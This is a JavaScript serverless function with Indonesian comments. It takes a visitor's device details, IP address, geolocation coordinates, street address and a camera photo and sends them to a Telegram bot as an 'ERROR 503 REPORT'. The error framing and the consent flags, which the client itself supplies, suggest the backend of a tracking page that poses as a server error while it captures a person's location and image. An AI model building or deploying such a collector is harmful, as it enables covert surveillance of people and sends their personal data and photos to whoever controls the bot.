module.exports = async (req, res) => {
    if (req.method !== "POST") {
        return res.status(405).json({
            success: false,
            message: "Method not allowed"
        });
    }

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({
            success: false,
            message: "Telegram configuration is missing"
        });
    }

    const unavailable = "Tidak tersedia";

    const safe = (value, fallback = unavailable) => {
        if (value === undefined || value === null || value === "") {
            return fallback;
        }

        return String(value).slice(0, 500);
    };

    try {
        const data = req.body || {};

        // Persetujuan umum wajib diberikan.
        if (data.consent !== true) {
            return res.status(403).json({
                success: false,
                message: "Persetujuan pengguna diperlukan"
            });
        }

        const locationConsent = data.locationConsent === true;
        const photoConsent = data.photoConsent === true;

        // Data lokasi hanya diterima jika pengguna menyetujuinya.
        const latitude = locationConsent
            ? safe(data.latitude)
            : "Tidak diberikan izin";

        const longitude = locationConsent
            ? safe(data.longitude)
            : "Tidak diberikan izin";

        const accuracy = locationConsent
            ? safe(data.accuracy)
            : "Tidak diberikan izin";

        // Foto hanya diterima jika pengguna menyetujui.
        let photo = null;

        if (photoConsent && typeof data.photo === "string") {
            if (
                data.photo.startsWith("data:image/jpeg;base64,") &&
                data.photo.length < 8_000_000
            ) {
                photo = data.photo.split(",")[1];
            }
        }

        // Mengambil IP dari header Vercel.
        const forwarded = req.headers["x-forwarded-for"];
        const ip = forwarded
            ? String(forwarded).split(",")[0].trim()
            : safe(req.headers["x-real-ip"]);

        const report = `
🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏷️ Brand          : ${safe(data.brand)}
📱 Device Model   : ${safe(data.deviceModel)}
🧠 OS             : ${safe(data.os)}
💻 Platform       : ${safe(data.platform)}
⚙️ CPU Cores      : ${safe(data.cpu)}
💾 RAM            : ${safe(data.ram)}
🖥 Resolution     : ${safe(data.resolution)}
🌐 Browser        : ${safe(data.browser)}

🕒 Timezone       : ${safe(data.timezone)}
🗣 Language       : ${safe(data.language)}
🌍 Public IP      : ${safe(ip)}

━━━━━━━━━━━━━━━━━━━━
🌎 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━
🌍 Country        : ${safe(data.country)}
📍 Region         : ${safe(data.region)}
🏙 City           : ${safe(data.city)}
🏢 ISP / Org      : ${safe(data.isp)}

━━━━━━━━━━━━━━━━━━━━
🏠 ADDRESS INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏘 Village        : ${safe(data.village)}
🏙 District       : ${safe(data.district)}
🏛 City           : ${safe(data.addressCity)}
🌆 Province       : ${safe(data.province)}
📮 Postal Code    : ${safe(data.postalCode)}
🌍 Country        : ${safe(data.addressCountry)}

━━━━━━━━━━━━━━━━━━━━
📷 CAMERA INFORMATION
━━━━━━━━━━━━━━━━━━━━
📸 Camera         : ${photo ? "Foto disetujui dan diterima" : "Tidak ada foto"}
🤝 Photo Consent  : ${photoConsent ? "Ya" : "Tidak"}

━━━━━━━━━━━━━━━━━━━━
📐 LOCATION INFORMATION
━━━━━━━━━━━━━━━━━━━━
🎯 Latitude       : ${latitude}
🎯 Longitude      : ${longitude}
📏 Accuracy       : ${accuracy}
🤝 Location Consent: ${locationConsent ? "Ya" : "Tidak"}

🗺 Google Maps    : ${
            locationConsent &&
            latitude !== unavailable &&
            longitude !== unavailable &&
            latitude !== "Tidak diberikan izin" &&
            longitude !== "Tidak diberikan izin"
                ? `https://www.google.com/maps?q=${encodeURIComponent(latitude)},${encodeURIComponent(longitude)}`
                : "Tidak tersedia"
        }

━━━━━━━━━━━━━━━━━━━━
⏰ TIME INFORMATION
━━━━━━━━━━━━━━━━━━━━
📅 Date           : ${new Date().toLocaleDateString("id-ID", {
            timeZone: data.timezone || "Asia/Jakarta"
        })}
🕒 Time           : ${new Date().toLocaleTimeString("id-ID", {
            timeZone: data.timezone || "Asia/Jakarta"
        })}

━━━━━━━━━━━━━━━━━━━━
✅ END OF REPORT
`;

        // Kirim laporan teks ke Telegram.
        const telegramURL =
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        const messageResponse = await fetch(telegramURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: report
            })
        });

        const messageResult = await messageResponse.json();

        if (!messageResult.ok) {
            throw new Error("Telegram gagal mengirim laporan");
        }

        // Kirim foto secara terpisah jika disetujui.
        if (photo) {
            const form = new FormData();

            form.append("chat_id", CHAT_ID);
            form.append(
                "photo",
                new Blob(
                    [Buffer.from(photo, "base64")],
                    { type: "image/jpeg" }
                ),
                "user-photo.jpg"
            );

            form.append(
                "caption",
                "📷 Foto yang telah disetujui pengguna."
            );

            const photoResponse = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                {
                    method: "POST",
                    body: form
                }
            );

            const photoResult = await photoResponse.json();

            if (!photoResult.ok) {
                throw new Error("Laporan terkirim, tetapi foto gagal dikirim");
            }
        }

        return res.status(200).json({
            success: true,
            message: "Laporan berhasil dikirim"
        });

    } catch (error) {
        console.error("Send report error:", error);

        return res.status(500).json({
            success: false,
            message: "Gagal mengirim laporan"
        });
    }
};
